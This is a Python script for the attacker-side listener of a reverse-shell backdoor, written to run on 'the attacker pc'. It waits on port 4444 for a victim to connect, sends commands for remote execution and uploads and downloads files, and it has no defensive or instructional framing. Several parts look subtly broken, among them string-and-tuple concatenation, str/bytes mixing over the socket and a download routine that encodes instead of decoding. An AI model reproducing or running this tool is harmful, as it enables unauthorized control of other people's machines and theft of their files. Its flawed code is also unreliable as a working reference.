# This file needs to run in the attacker pc

import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection,  address = listener.accept()
        print("[+] Got a connection from " + address)


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)


    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64encode(content))
            return "[+] Download successful."


    def execute_remotely(self, command):
        self.reliable_send(command)
        
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_recieve()


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)
                
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error in command execution."
            print(result)

my_listener = Listener("10.0.2.16", 4444)
my_listener.run()
